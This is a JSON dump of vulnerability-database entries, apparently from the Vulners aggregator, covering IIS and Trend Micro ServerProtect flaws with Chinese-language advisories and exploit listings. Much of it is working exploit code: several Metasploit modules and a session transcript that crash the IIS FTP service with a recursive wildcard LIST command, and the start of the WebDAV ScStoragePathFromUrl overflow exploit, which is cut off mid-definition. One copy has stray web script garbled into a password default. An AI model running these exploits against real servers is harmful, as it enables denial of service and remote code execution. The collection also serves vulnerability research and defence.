                "vector": "AV:NETWORK/AC:LOW/Au:SINGLE_INSTANCE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:4241"
        }
    ],
    "CVE-2008-0074": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 32261\r\nCVE(CAN) ID: CVE-2006-5268,CVE-2007-0072,CVE-2007-0073,CVE-2007-0074,CVE-2006-5269,CVE-2008-0012,CVE-2008-0013,CVE-2008-0014\r\n\r\nTrend ServerProtect\u662f\u4e00\u6b3e\u4f01\u4e1a\u7ea7\u53cd\u75c5\u6bd2\u7a0b\u5e8f\u3002 \r\n\r\nServerProtect\u7684RPC\u8ba4\u8bc1\u8fc7\u7a0b\u53ef\u80fd\u5141\u8bb8\u672a\u7ecf\u8ba4\u8bc1\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u83b7\u5f97\u5bf9RPC\u63a5\u53e3\u7684\u7ba1\u7406\u8bbf\u95ee\uff1b\u6b64\u5916\u591a\u4e2aRPC\u8fc7\u7a0b\u4e2d\u8fd8\u5b58\u5728\u5806\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u63d0\u4ea4\u6076\u610f\u8bf7\u6c42\u89e6\u53d1\u8fd9\u4e9b\u6ea2\u51fa\uff0c\u5bfc\u81f4\u6267\u884c\u4efb\u610f\u6307\u4ee4\u3002\r\n\n\nTrend Micro ServerProtect 5.7\r\nTrend Micro ServerProtect 5.58\n Trend Micro\r\n-----------\r\n\u76ee\u524d\u5382\u5546\u8fd8\u6ca1\u6709\u63d0\u4f9b\u8865\u4e01\u6216\u8005\u5347\u7ea7\u7a0b\u5e8f\uff0c\u6211\u4eec\u5efa\u8bae\u4f7f\u7528\u6b64\u8f6f\u4ef6\u7684\u7528\u6237\u968f\u65f6\u5173\u6ce8\u5382\u5546\u7684\u4e3b\u9875\u4ee5\u83b7\u53d6\u6700\u65b0\u7248\u672c\uff1a\r\n\r\n<a href=http://www.antivirus.com/ target=_blank>http://www.antivirus.com/</a>",
            "modified": "2008-11-14T00:00:00",
            "published": "2008-11-14T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-4451",
            "id": "SSV:4451",
            "title": "Trend Micro ServerProtect\u591a\u4e2a\u8fdc\u7a0b\u5806\u6ea2\u51fa\u53ca\u975e\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:4451"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 27101\r\nCVE(CAN) ID: CVE-2008-0074\r\n\r\nMicrosoft Internet\u4fe1\u606f\u670d\u52a1\uff08IIS\uff09\u662fMicrosoft Windows\u81ea\u5e26\u7684\u4e00\u4e2a\u7f51\u7edc\u4fe1\u606f\u670d\u52a1\u5668\uff0c\u5176\u4e2d\u5305\u542bHTTP\u670d\u52a1\u529f\u80fd\u3002\r\n\r\nIIS\u5904\u7406FTPRoot\u3001NNTPFile\\Root\u548cWWWRoot\u6587\u4ef6\u5939\u4e2d\u6587\u4ef6\u53d8\u5316\u901a\u77e5\u7684\u65b9\u5f0f\u5b58\u5728\u672c\u5730\u6743\u9650\u63d0\u5347\u6f0f\u6d1e\uff0c\u6210\u529f\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u672c\u5730\u7cfb\u7edf\u5b89\u5168\u73af\u5883\u4e2d\u6267\u884c\u4efb\u610f\u6307\u4ee4\u3002\r\n\r\n\n\nMicrosoft IIS 7.0\r\nMicrosoft IIS 6.0\r\nMicrosoft IIS 5.1\r\nMicrosoft IIS 5.0\n \u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5\uff1a\r\n\r\n* \u5728Windows Server 2003\u4e0a\u505c\u6b62FTP\u548cNNTP\u670d\u52a1\uff1a\r\n      \r\n      net stop msftpsvc\r\n      net stop nntpsvc\r\n\r\n* \u5bf9\u4e8e\u7528\u4e8e\u6267\u884c\u7528\u6237\u63a7\u5236ASP\u9875\u9762\u7684\u5e10\u53f7\uff0c\u62d2\u7edd\u5bf9NNTP root\u3001FTP root\u548cWWW root\u6587\u4ef6\u5939\u7684\u5199\u8bbf\u95ee\uff1a\r\n    \r\n    cacls c:\\inetpub\\ftproot /E /P IUSR_WS2003ENTSP1:R\r\n    cacls c:\\inetpub\\ftproot /E /P USERS:R\r\n    cacls c:\\inetpub\\nntpfile\\root /E /P &quot;ANONYMOUS LOGON&quot;:R\r\n    cacls c:\\inetpub\\nntpfile\\root /E /P EVERYONE:R\r\n\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nMicrosoft\r\n---------\r\nMicrosoft\u5df2\u7ecf\u4e3a\u6b64\u53d1\u5e03\u4e86\u4e00\u4e2a\u5b89\u5168\u516c\u544a\uff08MS08-005\uff09\u4ee5\u53ca\u76f8\u5e94\u8865\u4e01:\r\nMS08-005\uff1aVulnerability in Internet Information Services Could Allow Elevation of Privilege (942831)\r\n\u94fe\u63a5\uff1a<a href=http://www.microsoft.com/technet/security/Bulletin/MS08-005.mspx?pf=true target=_blank>http://www.microsoft.com/technet/security/Bulletin/MS08-005.mspx?pf=true</a>",
            "modified": "2008-02-20T00:00:00",
            "published": "2008-02-20T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-2902",
            "id": "SSV:2902",
            "title": "Microsoft IIS\u6587\u4ef6\u66f4\u6539\u901a\u77e5\u672c\u5730\u6743\u9650\u63d0\u5347\u6f0f\u6d1e\uff08MS08-005\uff09",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 7.2,
                "vector": "AV:LOCAL/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:2902"
        }
    ],
    "CVE-2009-2521": [
        {
            "bulletinFamily": "exploit",
            "description": "This module triggers Denial of Service condition in the Microsoft Internet Information Services (IIS) FTP Server 5.0 through 7.0 via a list (ls) -R command containing a wildcard. For this exploit to work in most cases, you need 1) a valid ftp account: either read-only or write-access account 2) the \"FTP Publishing\" must be configured as \"manual\" mode in startup type 3) there must be at least one directory under FTP root directory. If your provided an FTP account has write-access privilege and there is no single directory, a new directory with random name will be created prior to sending exploit payload.\n",
            "modified": "2019-05-23T12:01:21",
            "published": "2011-11-26T19:30:35",
            "id": "MSF:AUXILIARY/DOS/WINDOWS/FTP/IIS_LIST_EXHAUSTION",
            "href": "",
            "type": "metasploit",
            "title": "Microsoft IIS FTP Server LIST Stack Exhaustion",
            "sourceData": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft IIS FTP Server LIST Stack Exhaustion',\n      'Description'    => %q{\n          This module triggers Denial of Service condition in the Microsoft Internet\n        Information Services (IIS) FTP Server 5.0 through 7.0 via a list (ls) -R command\n        containing a wildcard. For this exploit to work in most cases, you need 1) a valid\n        ftp account: either read-only or write-access account 2) the \"FTP Publishing\" must\n        be configured as \"manual\" mode in startup type 3) there must be at least one\n        directory under FTP root directory. If your provided an FTP account has write-access\n        privilege and there is no single directory, a new directory with random name will be\n        created prior to sending exploit payload.\n      },\n      'Author'         =>\n        [\n          'Kingcope', # Initial discovery\n          'Myo Soe'   # Metasploit Module (http://yehg.net)\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-2521'],\n          [ 'BID', '36273'],\n          [ 'OSVDB', '57753'],\n          [ 'MSB', 'MS09-053'],\n          [ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2009-09/0040.html']\n        ],\n      'DisclosureDate' => 'Sep 03 2009'))\n  end\n\n  def run\n    # Attempt to crash IIS FTP\n    begin\n      return unless connect_login\n      print_status('Checking if there is at least one directory ...')\n      res = send_cmd_data(['ls'],'')\n\n      if res.to_s =~ /\\<DIR\\>          / then\n        print_status('Directory found, skipped creating a directory')\n      else\n        print_status('No single directory found')\n        print_status('Attempting to create a directory ...')\n        new_dir = Rex::Text.rand_text_alphanumeric(6)\n        res = send_cmd(['mkd',new_dir])\n        if res =~ /directory created/ then\n          print_status(\"New directory \\\"#{new_dir}\\\" was created!\")\n        else\n          print_error('Write-access was denied')\n          print_error('Exploit failed')\n          disconnect\n          return\n        end\n      end\n\n      print_status(\"Sending DoS packets ...\")\n      res = send_cmd_datax(['ls','-R */../'],' ')\n      disconnect\n    rescue ::Interrupt\n      raise $!\n    rescue ::Rex::ConnectionRefused\n      print_error(\"Cannot connect. The server is not running.\")\n      return\n    rescue Rex::ConnectionTimeout\n      print_error(\"Cannot connect. The connection timed out.\")\n      return\n    rescue\n    end\n\n    #More careful way to check DOS\n    print_status(\"Checking server's status...\")\n    begin\n      connect_login\n      disconnect\n      print_error(\"DOS attempt failed.  The service is still running.\")\n    rescue\n      print_good(\"Success! Service is down\")\n    end\n  end\n\n  # Workaround: modified send_cmd_data function with short sleep time before data_disconnect call\n  # Bug Tracker: 4868\n  def send_cmd_datax(args, data, mode = 'a', nsock = self.sock)\n    args[0] = \"LIST\"\n    # Set the transfer mode and connect to the remove server\n    return nil if not data_connect(mode)\n    # Our pending command should have got a connection now.\n    res = send_cmd(args, true, nsock)\n    # make sure could open port\n    return nil unless res =~ /^(150|125) /\n    # dispatch to the proper method\n    begin\n      data = self.datasocket.get_once(-1, ftp_timeout)\n    rescue ::EOFError\n      data = nil\n    end\n    select(nil,nil,nil,1)\n    # close data channel so command channel updates\n    data_disconnect\n    # get status of transfer\n    ret = nil\n    ret = recv_ftp_resp(nsock)\n    ret = [ ret, data ]\n    ret\n  end\nend\n",
            "cvss": {
                "score": 2.6,
                "vector": "AV:N/AC:H/Au:N/C:N/I:N/A:P"
            },
            "vhref": "https://vulners.com/metasploit/MSF:AUXILIARY/DOS/WINDOWS/FTP/IIS_LIST_EXHAUSTION"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2011-07-03T00:00:00",
            "published": "2011-07-03T00:00:00",
            "href": "https://packetstormsecurity.com/files/102750/Microsoft-IIS-FTP-Server-7.0-Stack-Exhaustion.html",
            "id": "PACKETSTORM:102750",
            "type": "packetstorm",
            "title": "Microsoft IIS FTP Server 7.0 Stack Exhaustion",
            "sourceData": "`# Exploit Title: [MS09-053] Microsoft IIS FTP Server <= 7.0 Stack Exhaustion DoS  \n# Date: Jul 03, 2011  \n# Author: Myo Soe <YGN Ethical Hacker Group - http://yehg.net/>  \n# Software Link: http://www.microsoft.com/  \n# Version: 5.0 - 7.0  \n# Tested on: unpatched version of windows xp & 2k3  \n  \n##  \n# This file is part of the Metasploit Framework and may be subject to  \n# redistribution and commercial restrictions. Please see the Metasploit  \n# Framework web site for more information on licensing and terms of use.  \n# http://metasploit.com/framework/  \n##  \n  \nrequire 'msf/core'  \n  \nclass Metasploit3 < Msf::Auxiliary  \n  \ninclude Msf::Exploit::Remote::Ftp  \ninclude Msf::Auxiliary::Dos  \n  \ndef initialize(info = {})  \nsuper(update_info(info,  \n'Name' => 'Microsoft IIS FTP Server <= 7.0 LIST Stack Exhaustion Denial of Service',  \n'Description' => %q{  \nThis module triggers Denial of Service condition in the Microsoft Internet Information Services (IIS) FTP Server 5.0 through 7.0 via a list (ls) -R command containing a wildcard. This exploit is especially meant for the service which is configured as \"manual\" mode in startup type.  \n},  \n'Author' => [  \n'Nikolaos \"Kingcope\" Rangos', # Bug Discoverer  \n'Myo Soe <YGN Ethical Hacker Group, http://yehg.net/>' # Metasploit Module  \n],   \n'License' => MSF_LICENSE,  \n'Version' => '$Revision: 1.0 $',  \n'References' =>  \n[  \n[ 'CVE', '2009-2521'],  \n[ 'BID', '36273'],  \n[ 'OSVDB', '57753'],  \n[ 'URL', 'https://www.microsoft.com/technet/security/Bulletin/MS09-053.mspx'],  \n[ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2009-09/0040.html']  \n  \n],  \n'DisclosureDate' => 'Sep 03 2009'))  \n  \nregister_options([  \nOptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),  \nOptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'mozilla@example.com<script type=\"text/javascript\">  \n/* <![CDATA[ */  \n(function(){try{var s,a,i,j,r,c,l=document.getElementById(\"__cf_email__\");a=l.className;if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();  \n/* ]]> */  \n</script>' ])  \n])  \nend  \n  \ndef run  \n  \nreturn unless connect_login  \n  \nprint_status(\"Sending DoS packets ...\")  \n  \nsend_cmd_data(['ls','-R */../'],nil)   \n  \ndisconnect  \n  \nprint_good(\"Done\")  \n  \nend  \nend  \n  \n`\n",
            "cvss": {
                "score": 2.6,
                "vector": "AV:NETWORK/AC:HIGH/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:102750"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Microsoft IIS FTP Server <= 7.0 - Stack Exhaustion DoS (MS09-053). CVE-2009-2521. Dos exploit for windows platform",
            "modified": "2011-07-03T00:00:00",
            "published": "2011-07-03T00:00:00",
            "id": "EDB-ID:17476",
            "href": "https://www.exploit-db.com/exploits/17476/",
            "type": "exploitdb",
            "title": "Microsoft IIS FTP Server <= 7.0 - Stack Exhaustion DoS MS09-053",
            "sourceData": "# Exploit Title: [MS09-053] Microsoft IIS FTP Server <= 7.0 Stack Exhaustion DoS\r\n# Date: Jul 03, 2011\r\n# Updated: Jul 13, 2011\r\n# Author: Myo Soe <YGN Ethical Hacker Group - http://yehg.net/>\r\n# Software Link: http://www.microsoft.com/\r\n# Version: 5.0 - 7.0\r\n# Tested on: unpatched version of windows xp & 2k3\r\n\r\n##\r\n# $Id: $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Auxiliary\r\n\r\n\tinclude Msf::Exploit::Remote::Ftp\r\n\tinclude Msf::Auxiliary::Dos\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => 'Microsoft IIS FTP Server <= 7.0 LIST Stack Exhaustion Denial of Service',\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\tThis module triggers Denial of Service condition in the Microsoft Internet Information Services (IIS) FTP Server 5.0 through 7.0 via a list (ls) -R command containing a wildcard. For this exploit to work in most cases, you need 1) a valid ftp account: either read-only or write-access account 2) the \"FTP Publishing\" service must be configured as \"manual\" mode in startup type 3) there must be at least one directory under FTP root directory. If your provided FTP account has write-access privilege and there is no single directory, a new directory with random name will be created prior to sending exploit payload.\r\n\t\t\t},\r\n\t\t\t'Author'         => [\r\n\t\t\t\t\t'Nikolaos \"Kingcope\" Rangos',  # Bug Discoverer\r\n\t\t\t\t\t'Myo Soe <YGN Ethical Hacker Group, http://yehg.net/>'  # Metasploit Module\r\n\t\t\t\t\t],\t\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Version'        => '$Revision: 4 $',\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2009-2521'],\r\n\t\t\t\t\t[ 'BID', '36273'],\r\n\t\t\t\t\t[ 'OSVDB', '57753'],\r\n\t\t\t\t\t[ 'URL', 'https://www.microsoft.com/technet/security/Bulletin/MS09-053.mspx'],\r\n\t\t\t\t\t[ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2009-09/0040.html']\r\n\r\n\t\t\t\t],\r\n\t\t\t'DisclosureDate' => 'Sep 03 2009'))\r\n\r\n\t\tregister_options([\r\n\t\t\tOptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),\r\n\t\t\tOptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'mozilla@example.com' ])\r\n\t\t])\r\n\tend\r\n\r\n\tdef run\t\t\t\t\r\n\t\tbegin\r\n\t\t\treturn unless connect_login\r\n\t\t\tprint_status('Checking if there is at least one directory ...')\t\r\n\t\t\tres = send_cmd_data(['ls'],'')\t\r\n\t\t\t\r\n\t\t\tif res.to_s =~ /\\<DIR\\>          / then\r\n\t\t\t\tprint_status('Directory found, skipped creating a directory')\r\n\t\t\telse\r\n\t\t\t\tprint_status('No single directory found')\r\n\t\t\t\tprint_status('Attempting to create a directory ...')\t\r\n\t\t\t\tnew_dir = Rex::Text.rand_text_alphanumeric(6)\t\t\r\n\t\t\t\tres = send_cmd(['mkd',new_dir])\t\t\t\r\n\t\t\t\tif res =~ /directory created/ then\r\n\t\t\t\t\tprint_status(\"New directory \\\"#{new_dir}\\\" was created!\")\r\n\t\t\t\telse\r\n\t\t\t\t\tprint_error('Write-access was denied')\r\n\t\t\t\t\tprint_error('Exploit failed')\r\n\t\t\t\t\tdisconnect\r\n\t\t\t\t\treturn\r\n\t\t\t\tend\t\t\r\n\t\t\tend\t\t\r\n\t\t\t\r\n\t\t\tprint_status(\"Sending DoS packets ...\")\t\r\n\t\t\tres = send_cmd_datax(['ls','-R */../'],' ')\t\t\t\t\r\n\t\t\tdisconnect\t\t\t\t\r\n\t\trescue ::Interrupt\r\n\t\t\traise $!\r\n\t\trescue Errno::ECONNRESET\r\n\t\t\tprint_good(\"MS IIS FTP Server has crashed successfully.\")\t\r\n\t\trescue ::Rex::ConnectionRefused\r\n\t\t\tprint_good(\"Cannot connect. The server is not running.\")\t\r\n\t\tend\r\n\tend\r\n\r\n\t# Workaround: modified send_cmd_data function with short sleep time before data_disconnect call\r\n\t# Bug Tracker: 4868\r\n\tdef send_cmd_datax(args, data, mode = 'a', nsock = self.sock)\r\n\t\targs[0] = \"LIST\"\r\n\t\t# Set the transfer mode and connect to the remove server\r\n\t\treturn nil if not data_connect(mode)\r\n\t\t# Our pending command should have got a connection now.\r\n\t\tres = send_cmd(args, true, nsock)\r\n\t\t# make sure could open port\r\n\t\treturn nil unless res =~ /^(150|125) /\r\n\t\t# dispatch to the proper method\r\n\t\tbegin\r\n\t\t\tdata = self.datasocket.get_once(-1, ftp_timeout)\r\n\t\trescue ::EOFError\r\n\t\t\tdata = nil\r\n\t\tend\r\n\t\tselect(nil,nil,nil,1)\r\n\t\t# close data channel so command channel updates\r\n\t\tdata_disconnect\r\n\t\t# get status of transfer\r\n\t\tret = nil\r\n\t\tret = recv_ftp_resp(nsock)\r\n\t\tret = [ ret, data ]\r\n\t\tret\r\n\tend\r\n\r\nend\r\n",
            "cvss": {
                "score": 2.6,
                "vector": "AV:NETWORK/AC:HIGH/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:17476"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 36273\r\nCVE ID: CVE-2009-2521\r\n\r\nMicrosoft Internet\u4fe1\u606f\u670d\u52a1\uff08IIS\uff09\u662fMicrosoft Windows\u81ea\u5e26\u7684\u4e00\u4e2a\u7f51\u7edc\u4fe1\u606f\u670d\u52a1\u5668\uff0c\u5176\u4e2d\u5305\u542bHTTP\u670d\u52a1\u529f\u80fd\u3002\r\n\r\nIIS\u7684FTPd\u7684Glob\u529f\u80fd\u5728\u5904\u7406\u9012\u5f52\u76ee\u5f55\u5217\u8868\u8bf7\u6c42\u65f6\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u62e5\u6709\u5bf9\u76ee\u5f55\u5199\u8bbf\u95ee\u6743\u9650\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u63d0\u4ea4\u5305\u542b\u6709\u901a\u914d\u7b26\uff08\u5982\u201c*\u201d\uff09\u7684\u8bf7\u6c42\u89e6\u53d1\u8fd9\u4e2a\u6ea2\u51fa\uff0c\u5bfc\u81f4FTP\u670d\u52a1\u5d29\u6e83\u3002\n\nMicrosoft IIS 7.0\r\nMicrosoft IIS 6.0\r\nMicrosoft IIS 5.1\r\nMicrosoft IIS 5.0\n\u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5\uff1a\r\n\r\n\u5982\u679c\u60a8\u4e0d\u80fd\u7acb\u523b\u5b89\u88c5\u8865\u4e01\u6216\u8005\u5347\u7ea7\uff0cNSFOCUS\u5efa\u8bae\u60a8\u91c7\u53d6\u4ee5\u4e0b\u63aa\u65bd\u4ee5\u964d\u4f4e\u5a01\u80c1\uff1a\r\n\r\n* \u7981\u7528FTP\u670d\u52a1\u3002\r\n* \u7981\u6b62\u533f\u540d\u7528\u6237\u7684FTP\u8bbf\u95ee\u6216\u5199\u8bbf\u95ee\u3002\r\n* \u4fee\u6539NTFS\u6587\u4ef6\u7cfb\u7edf\u6743\u9650\uff0c\u7981\u6b62FTP\u7528\u6237\u521b\u5efa\u76ee\u5f55\u3002\r\n* \u5347\u7ea7\u5230FTP Service 7.5\u3002\r\n\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nMicrosoft\r\n---------\r\nMicrosoft\u5df2\u7ecf\u4e3a\u6b64\u53d1\u5e03\u4e86\u4e00\u4e2a\u5b89\u5168\u516c\u544a\uff08MS09-053\uff09\u4ee5\u53ca\u76f8\u5e94\u8865\u4e01:\r\nMS09-053\uff1aVulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254)\r\n\u94fe\u63a5\uff1ahttp://www.microsoft.com/technet/security/Bulletin/MS09-053.mspx?pf=true",
            "modified": "2009-10-16T00:00:00",
            "published": "2009-10-16T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-12477",
            "id": "SSV:12477",
            "title": "Microsoft IIS FTP\u670d\u52a1\u5668\u9012\u5f52\u5217\u8868\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e(MS09-053)",
            "type": "seebug",
            "sourceData": "\n                                                ftp&gt; ls &quot;-R p*/../&quot;\n                              ",
            "cvss": {
                "score": 2.6,
                "vector": "AV:NETWORK/AC:HIGH/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:12477"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 36273\r\nCVE(CAN) ID: CVE-2009-2521\r\n\r\nMicrosoft Internet\u4fe1\u606f\u670d\u52a1\uff08IIS\uff09\u662fMicrosoft Windows\u81ea\u5e26\u7684\u4e00\u4e2a\u7f51\u7edc\u4fe1\u606f\u670d\u52a1\u5668\uff0c\u5176\u4e2d\u5305\u542bHTTP\u670d\u52a1\u529f\u80fd\u3002\r\n\r\nIIS\u7684FTPd\u7684Glob\u529f\u80fd\u5728\u5904\u7406\u9012\u5f52\u76ee\u5f55\u5217\u8868\u8bf7\u6c42\u65f6\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u62e5\u6709\u5bf9\u76ee\u5f55\u5199\u8bbf\u95ee\u6743\u9650\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u63d0\u4ea4\u5305\u542b\u6709\u901a\u914d\u7b26\uff08\u5982\u201c*\u201d\uff09\u7684\u8bf7\u6c42\u89e6\u53d1\u8fd9\u4e2a\u6ea2\u51fa\uff0c\u5bfc\u81f4FTP\u670d\u52a1\u5d29\u6e83\u3002\n\nMicrosoft IIS 7.0\r\nMicrosoft IIS 6.0\r\nMicrosoft IIS 5.1\r\nMicrosoft IIS 5.0\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nMicrosoft\r\n---------\r\n\u76ee\u524d\u5382\u5546\u8fd8\u6ca1\u6709\u63d0\u4f9b\u8865\u4e01\u6216\u8005\u5347\u7ea7\u7a0b\u5e8f\uff0c\u6211\u4eec\u5efa\u8bae\u4f7f\u7528\u6b64\u8f6f\u4ef6\u7684\u7528\u6237\u968f\u65f6\u5173\u6ce8\u5382\u5546\u7684\u4e3b\u9875\u4ee5\u83b7\u53d6\u6700\u65b0\u7248\u672c\uff1a\r\n\r\nhttp://www.microsoft.com/technet/security/",
            "modified": "2009-09-08T00:00:00",
            "published": "2009-09-08T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-12236",
            "id": "SSV:12236",
            "title": "Microsoft IIS FTP\u670d\u52a1\u5668\u9012\u5f52\u5217\u8868\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "\n                                                ftp&gt; ls &quot;-R p*/../&quot;\n                              ",
            "cvss": {
                "score": 2.6,
                "vector": "AV:NETWORK/AC:HIGH/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:12236"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Microsoft IIS 5.0/6.0 FTP Server (Stack Exhaustion) Denial of Service. CVE-2009-2521. Dos exploit for windows platform",
            "modified": "2009-09-04T00:00:00",
            "published": "2009-09-04T00:00:00",
            "id": "EDB-ID:9587",
            "href": "https://www.exploit-db.com/exploits/9587/",
            "type": "exploitdb",
            "title": "Microsoft IIS 5.0/6.0 FTP Server Stack Exhaustion Denial of Service",
            "sourceData": "***** MS IIS FTPD DoS ZER0DAY *****\r\n\r\nThere is a DoS vulnerability in the globbing functionality of IIS FTPD.\r\nAnonymous users can exploit this if they have read access to a directory!!!\r\nNormal users can exploit this too if they can read a directory.\r\n\r\nExample session where the anonymous user has read access to the folder \"pub\":\r\n\r\nC:\\Users\\Nikolaos>ftp 192.168.2.102\r\nVerbindung mit 192.168.2.102 wurde hergestellt.\r\n220 Microsoft FTP Service\r\nBenutzer (192.168.2.102:(none)): ftp\r\n331 Anonymous access allowed, send identity (e-mail name) as password.\r\nKennwort:\r\n230 Anonymous user logged in.\r\nftp> ls \"-R p*/../\"\r\n...\r\np*/../pub:\r\npub\r\n...\r\np*/../pub:\r\npub\r\n...\r\np*/../pub:\r\npub\r\n...\r\np*/../pub:\r\npub\r\n...\r\nVerbindung beendet durch Remotehost. (MEANS: Remote Host has closed\r\nthe connection)\r\nftp>\r\nftp>\r\n\r\nBy looking into my debugging session with OllyDbg I see that an\r\nexception is raised and\r\nthe ftp service crashes due to a \"stack overflow\", what is a stack exhaustion.\r\nIf the ftp service is set to \"manual\" startup in services control\r\nmanager the service\r\nneeds to be restarted manually.\r\nIIS 5.0 and 6.0 were tested and are affected.\r\n\r\nBest Regards,\r\n\r\nNikolaos Rangos\r\n\r\n# milw0rm.com [2009-09-04]\r\n",
            "cvss": {
                "score": 2.6,
                "vector": "AV:NETWORK/AC:HIGH/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:9587"
        }
    ],
    "CVE-2017-7269": [
        {
            "bulletinFamily": "exploit",
            "description": "Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with \"If: Author(s) Zhiniang Peng Chen Wu Dominic Chell  firefart zcgonvh  Rich Whitcroft Lincoln Platform Windows\n",
            "modified": "2018-08-27T18:11:22",
            "published": "2017-03-28T14:53:18",
            "id": "MSF:EXPLOIT/WINDOWS/IIS/IIS_WEBDAV_SCSTORAGEPATHFROMURL",
            "href": "",
            "type": "metasploit",
            "title": "Microsoft IIS WebDav ScStoragePathFromUrl Overflow",
            "sourceData": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => ' Microsoft IIS WebDav ScStoragePathFromUrl Overflow',\n      'Description'    => %q{\n          Buffer overflow in the ScStoragePathFromUrl function\n          in the WebDAV service in Internet Information Services (IIS) 6.0\n          in Microsoft Windows Server 2003 R2 allows remote attackers to\n          execute arbitrary code via a long header beginning with\n          \"If: <http://\" in a PROPFIND request, as exploited in the\n          wild in July or August 2016.\n\n          Original exploit by Zhiniang Peng and Chen Wu.\n      },\n      'Author'         =>\n        [\n        'Zhiniang Peng', # Original author\n        'Chen Wu',       # Original author\n        'Dominic Chell <dominic@mdsec.co.uk>', # metasploit module\n        'firefart', # metasploit module\n        'zcgonvh <zcgonvh@qq.com>', # metasploit module\n        'Rich Whitcroft', # metasploit module\n        'Lincoln' # minor updates to metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2017-7269' ],\n          [ 'BID', '97127' ],\n          [ 'URL', 'https://github.com/edwardz246003/IIS_exploit' ],\n          [ 'URL', 'https://0patch.blogspot.com/2017/03/0patching-immortal-cve-2017-7269.html' ]\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'          => 2000,\n          'BadChars'       => \"\\x00\",\n          'EncoderType'    => Msf::Encoder::Type::AlphanumUnicodeMixed,\n          